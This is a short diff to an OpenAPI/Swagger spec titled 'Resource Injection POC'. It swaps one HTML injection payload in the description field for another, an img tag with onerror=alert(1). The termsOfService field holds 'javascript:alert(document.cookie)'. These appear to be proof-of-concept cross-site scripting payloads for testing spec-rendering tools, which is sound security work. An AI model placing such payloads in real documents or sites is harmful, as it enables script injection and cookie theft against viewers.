@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: Resource Injection POC
-  description: <h1>Iframe Injection</h1><img src="https://cdn.searchenginejournal.com/wp-content/uploads/2022/04/reverse-image-search-627b7e49986b0-sej-1520x800.png" onerror=alert(1)>
+  description: <img src="https://variety.com/wp-content/uploads/2021/07/Rick-Astley-Never-Gonna-Give-You-Up.png?w=2048" onerror=alert(1)>
   termsOfService: "javascript:alert(document.cookie)"
 paths:
   /:
